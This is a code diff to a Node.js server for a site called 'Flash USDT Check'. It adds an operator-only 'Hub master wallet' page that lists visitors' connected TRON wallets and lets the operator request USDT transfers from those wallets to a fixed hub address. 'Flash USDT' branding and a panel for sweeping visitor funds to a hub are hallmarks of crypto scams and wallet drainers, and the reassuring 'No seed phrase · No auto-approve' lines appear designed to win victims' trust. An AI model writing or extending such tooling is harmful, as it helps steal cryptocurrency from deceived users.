@@ -1,5 +1,6 @@
 import { createServer } from "node:http";
-import { timingSafeEqual, randomBytes } from "node:crypto";
+import { timingSafeEqual, randomBytes, createHash } from "node:crypto";
+import { readFileSync } from "node:fs";
 import { mkdir, readFile, rename, writeFile } from "node:fs/promises";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
@@ -27,6 +28,7 @@ const allowed = new Map([
   ["/generated/walletconnect-client.js", "text/javascript; charset=utf-8"],
   ["/src/app.js", "text/javascript; charset=utf-8"],
   ["/src/landing.js", "text/javascript; charset=utf-8"],
+  ["/src/master-wallet.js", "text/javascript; charset=utf-8"],
   ["/src/landing-transfer.mjs", "text/javascript; charset=utf-8"],
   ["/src/logic.mjs", "text/javascript; charset=utf-8"],
   ["/src/tron-public.mjs", "text/javascript; charset=utf-8"],
@@ -879,29 +881,55 @@ function masterWalletPage(wallets) {
   const cards = [...wallets].reverse().map((wallet) => {
     const target = escapeHtml(wallet.connectionTarget || CONNECTION_TARGET);
     const assets = formatMasterWalletAssetHtml(wallet.assets ?? { ok: false, error: "Balance unavailable" });
-    return `<article class="master-wallet-card">
+    const address = escapeHtml(wallet.address);
+    return `<article class="master-wallet-card" data-wallet-address="${address}">
       <header>
         <p class="master-wallet-kicker">Connected wallet</p>
-        <p class="address master-wallet-address">${escapeHtml(wallet.address)}</p>
+        <p class="address master-wallet-address">${address}</p>
         <p class="master-wallet-meta">Linked to hub <span class="address">${target}</span> · ${escapeHtml(formatConnectedAt(wallet.connectedAt))}</p>
       </header>
-      <h2 class="master-wallet-assets-title">Public assets</h2>
-      ${assets}
-      <p class="master-transfer-note">Any USDT transfer to the hub must be signed by this connecting wallet on <a href="/">Flash USDT Check</a>. This page never auto-approves and never asks for a seed phrase or private key.</p>
+      <button class="primary-action master-manage-open" type="button">Manage assets</button>
+      <div class="master-manage-panel" hidden>
+        <h2 class="master-wallet-assets-title">Full public assets</h2>
+        ${assets}
+        <form class="master-transfer-form">
+          <label>Transfer recipient (hub)</label>
+          <input class="master-transfer-recipient" type="text" value="${hub}" readonly spellcheck="false">
+          <label>USDT amount</label>
+          <input class="master-transfer-amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
+          <button class="primary-action master-review-transfer" type="submit">Review transfer to hub</button>
+        </form>
+        <div class="master-transfer-review" hidden>
+          <h3 class="master-review-title">Confirm before your wallet signs</h3>
+          <dl class="master-review-list">
+            <div><dt>From</dt><dd class="address master-review-from"></dd></div>
+            <div><dt>To (hub)</dt><dd class="address master-review-to"></dd></div>
+            <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
+            <div><dt>Amount</dt><dd class="master-review-amount"></dd></div>
+          </dl>
+          <p class="master-transfer-note">Reject the wallet prompt if any detail differs. No seed phrase · No private key · No auto-approve.</p>
+          <button class="primary-action master-connect-wallet" type="button">Connect TronLink to sign</button>
+          <button class="primary-action master-sign-transfer" type="button" hidden>Approve transfer in wallet</button>
+          <button class="retry-button master-cancel-transfer" type="button">Cancel review</button>
+          <p class="master-connect-status" role="status"></p>
+        </div>
+        <p class="master-transfer-status" role="status" aria-live="polite"></p>
+        <p class="master-transfer-error asset-error" role="alert" hidden></p>
+      </div>
     </article>`;
   }).join("");
   const body = cards || `<p>No wallets have connected yet.</p>`;
-  return pageShell("Hub master wallet", `<section class="card master-wallet-shell" aria-labelledby="master-wallet-title">
+  return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" aria-labelledby="master-wallet-title">
       <p class="eyebrow">Hub master wallet</p>
       <h1 id="master-wallet-title">Connected wallet review</h1>
-      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Read-only balances from public TRON data.</p>
+      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Manage assets and request hub transfers that only the connecting wallet can sign.</p>
       <p class="master-safety">No seed phrase · No private key · No auto-approve · Transfers require the visitor wallet signature</p>
-      <div class="master-wallet-grid">${body}</div>
+      <div class="master-wallet-grid" id="master-wallet-grid">${body}</div>
       <div class="master-wallet-actions">
         <a class="ghost" href="/">Flash USDT Check</a>
         <form method="post" action="/logout"><button class="ghost" type="submit">Log out</button></form>
       </div>
-    </section>`, { masterStyles: true });
+    </section>`, { masterStyles: true, masterScript: true });
 }
 
 /**
@@ -936,7 +964,7 @@ function walletListPage(wallets) {
 /**
  * @param {string} title
  * @param {string} main
- * @param {{ masterStyles?: boolean }} [options]
+ * @param {{ masterStyles?: boolean, masterScript?: boolean }} [options]
  */
 function pageShell(title, main, options = {}) {
   const extraStyles = options.masterStyles ? `
@@ -946,14 +974,25 @@ function pageShell(title, main, options = {}) {
     .master-wallet-kicker { margin: 0 0 6px; color: var(--accent); font-size: 0.68rem; font-weight: 800; letter-spacing: 0.12em; text-transform: uppercase; }
     .master-wallet-address { margin: 0 0 8px; word-break: break-all; }
     .master-wallet-meta { margin: 0 0 14px; color: var(--muted); font-size: 0.78rem; }
+    .master-manage-open { margin-top: 4px; }
+    .master-manage-panel { margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--line); }
     .master-wallet-assets-title { margin: 0 0 8px; font-size: 0.95rem; }
     .master-asset-list { margin: 0; padding-left: 18px; color: var(--text); }
     .master-asset-list li { margin: 4px 0; }
-    .master-transfer-note { margin: 14px 0 0; color: var(--muted); font-size: 0.78rem; }
+    .master-transfer-form label { display: block; margin: 12px 0 6px; color: var(--muted); font-size: 0.82rem; }
+    .master-transfer-form input { width: 100%; padding: 10px 12px; border: 1px solid var(--line); border-radius: 10px; background: rgba(8, 14, 12, 0.92); color: var(--text); font: inherit; }
+    .master-review-transfer, .master-connect-wallet, .master-sign-transfer { margin-top: 12px; margin-right: 8px; }
+    .master-review-title { margin: 16px 0 8px; font-size: 0.95rem; }
+    .master-review-list { display: grid; gap: 8px; margin: 0 0 10px; }
+    .master-review-list dt { color: var(--muted); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.08em; }
+    .master-review-list dd { margin: 0; }
+    .master-transfer-note { margin: 10px 0 0; color: var(--muted); font-size: 0.78rem; }
+    .master-connect-status, .master-transfer-status { margin: 10px 0 0; color: var(--muted); font-size: 0.78rem; }
     .master-safety { margin: 10px 0 0; color: var(--accent); font-size: 0.78rem; }
     .master-wallet-actions { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 22px; align-items: center; }
     .master-back-link { margin-top: 16px; font-size: 0.82rem; }
   ` : "";
+  const scriptTag = options.masterScript ? `\n  ${masterWalletScriptTag()}` : "";
   return `<!doctype html>
 <html lang="en">
 <head>
@@ -974,9 +1013,18 @@ function pageShell(title, main, options = {}) {
 <body>
   <main class="screen">
     ${main}
-  </main>
+  </main>${scriptTag}
 </body>
 </html>`;
+}
+
+/**
+ * @returns {string}
+ */
+function masterWalletScriptTag() {
+  const source = readFileSync(path.join(root, "src", "master-wallet.js"));
+  const query = createHash("sha256").update(source).digest("hex").slice(0, 12);
+  return `<script type="module" src="/src/master-wallet.js?v=${query}"></script>`;
 }
 
 /**
